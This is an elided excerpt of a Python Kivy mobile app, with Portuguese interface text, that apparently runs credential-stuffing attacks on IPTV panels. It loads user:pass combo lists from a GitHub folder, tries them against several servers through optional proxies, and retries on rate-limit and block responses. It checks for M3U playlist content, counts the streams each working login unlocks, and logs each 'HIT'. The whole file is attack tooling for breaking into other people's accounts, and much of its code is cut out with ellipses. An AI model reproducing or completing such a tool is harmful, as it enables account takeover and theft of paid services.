        ...
        try:
            ...
            if r.status_code == 200:
                try:
                    ...
                    return None
            if r.status_code in (403, 429, 520) and i < 2:
...
def check_target(server, item, timeout=8, proxy=None):
    ...
    data = fetch_json(url, timeout=timeout, server=server, proxy=proxy)
    if data:
    ...
    try:
        ...
        if r.status_code == 200 and r.content:
            t = r.content.decode('utf-8', errors='ignore') if isinstance(r.content, bytes) else str(r.content)
            if '#EXTM3U' in t or '#EXTINF' in t:
...
def fetch_counts(server, user, pwd):
    try:
        ...
        a = fetch_json(b + '&action=get_live_streams', server=server) or []
        f = fetch_json(b + '&action=get_vod_streams', server=server) or []
        s = fetch_json(b + '&action=get_series', server=server) or []
...
class AScanApp(App):
    ...
    def build(self):
        ...
        self.srv = []
        for i in range(5):
            e = Inp(hint_text='Servidor %d  (host:porta)' % (i + 1))
            self.srv.append(e)
            card.add_widget(e)
        ...
        row.add_widget(b2)
        card.add_widget(row)
        tip = T('Coloque .txt em combos/ no GitHub ou cole user:pass', size=11, muted=True)
        tip.height = dp(22)
        card.add_widget(tip)
        body.add_widget(card)
        ...
        def load_list(*_a):
            ...
            def work(dt):
                try:
                    ...
                    if r.status_code != 200:
                        status.text = 'Erro API %s (publique pasta combos/)' % r.status_code
                        return
                    files = [f for f in r.json() if f.get('type') == 'file' and f.get('name', '').lower().endswith(('.txt', '.csv', '.list'))]
                    if not files:
                        status.text = 'Nenhum .txt em combos/. Adicione no repo.'
                        return
    ...
    def start_scan(self, *_):
        if self.scan_running:
            return
        servers = [e.text.strip() for e in self.srv if e.text.strip()]
        if not servers:
        ...
        self.clock = Clock.schedule_interval(self._tick, 1.0)
                ...
                try:
                    ...
                    if ok:
                        ...
                        with _lock:
                            self.stats['hits'] += 1
                        Clock.schedule_once(
                            lambda dt, s=server, u=item[0]: self.log_msg('HIT %s | %s' % (s, u)), 0)
                except Exception:
                    pass
                finally:
                    try:
